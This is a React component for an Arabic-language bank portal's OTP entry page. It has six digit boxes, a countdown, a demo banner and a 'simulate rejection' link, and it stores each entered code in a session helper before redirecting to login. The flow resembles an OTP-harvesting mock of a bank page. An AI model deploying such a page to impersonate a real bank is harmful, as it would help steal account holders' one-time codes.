import React, { useState, useRef, useEffect } from "react";
import { Link, useNavigate } from "react-router-dom";
import { Smartphone, Check, Info } from "lucide-react";
import DemoBanner from "@/components/bank/DemoBanner";
import PortalLogo from "@/components/bank/PortalLogo";
import { appendOtpCode } from "@/lib/portalSession";
import { PRIVACY_NOTE } from "@/lib/bankData";

const GREEN = "#2c5a3d";
const GOLD = "#d4b97a";

export default function ForgotPassword() {
  const navigate = useNavigate();
  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
  const [seconds, setSeconds] = useState(176);
  const inputs = useRef([]);

  useEffect(() => {
    inputs.current[0]?.focus();
  }, []);

  useEffect(() => {
    if (seconds <= 0) return;
    const t = setInterval(() => setSeconds((s) => s - 1), 1000);
    return () => clearInterval(t);
  }, [seconds]);

  const handleChange = (i, val) => {
    if (!/^\d?$/.test(val)) return;
    const next = [...digits];
    next[i] = val;
    setDigits(next);
    if (val && i < 5) inputs.current[i + 1]?.focus();
  };

  const handleKey = (i, e) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) {
      inputs.current[i - 1]?.focus();
    }
  };

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");
  const complete = digits.every((d) => d !== "");

  const confirm = (e) => {
    e.preventDefault();
    if (!complete) return;
    appendOtpCode(digits.join(""));
    navigate("/login");
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <DemoBanner />
      <div className="flex-1 flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-md space-y-8 text-center">
          <div className="flex justify-center">
            <PortalLogo />
          </div>

          {/* Icon */}
          <div className="flex justify-center">
            <span
              className="w-20 h-20 rounded-full flex items-center justify-center"
              style={{ backgroundColor: `${GREEN}12` }}
            >
              <Smartphone className="w-9 h-9" style={{ color: GREEN }} />
            </span>
          </div>

          <div className="space-y-2">
            <h1 className="text-2xl font-bold" style={{ color: GREEN }}>رمز التحقق</h1>
            <p className="text-sm text-[#777777] leading-relaxed">
              أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك
            </p>
          </div>

          {/* OTP box */}
          <div className="rounded-2xl bg-white border border-slate-100 shadow-[0_8px_30px_rgba(0,0,0,0.06)] p-6 space-y-5">
            <div className="flex justify-center gap-2" dir="ltr">
              {digits.map((d, i) => (
                <input
                  key={i}
                  ref={(el) => (inputs.current[i] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={d}
                  onChange={(e) => handleChange(i, e.target.value)}
                  onKeyDown={(e) => handleKey(i, e)}
                  className="w-11 h-14 text-center text-xl font-bold rounded-lg border border-slate-200 focus:outline-none focus:border-[#2c5a3d] focus:ring-1 focus:ring-[#2c5a3d] bg-white"
                />
              ))}
            </div>

            <div className="text-sm font-medium" style={{ color: GREEN }} dir="ltr">
              انتهاء الصلاحية: {mm}:{ss}
            </div>
          </div>

          <button
            onClick={confirm}
            disabled={!complete}
            className="w-full h-12 rounded-xl font-bold text-white flex items-center justify-center gap-2 disabled:opacity-50 transition"
            style={{ backgroundColor: GOLD }}
          >
            <Check className="w-5 h-5" />
            تأكيد الرمز
          </button>

          <div className="text-center">
            <Link to="/forgot-password/reject" className="text-xs text-slate-400 hover:underline">محاكاة نتيجة الرفض</Link>
          </div>

          <div className="flex items-start gap-2 rounded-xl bg-[#2c5a3d]/5 border border-[#2c5a3d]/15 p-3 text-xs text-[#2c5a3d]">
            <Info className="w-4 h-4 shrink-0 mt-0.5" />
            <span>{PRIVACY_NOTE}</span>
          </div>

          <div className="text-center text-xs text-slate-400">
            <Link to="/portal" className="text-slate-500 hover:underline">العودة للبوابة</Link>
          </div>
        </div>
      </div>
    </div>
  );
}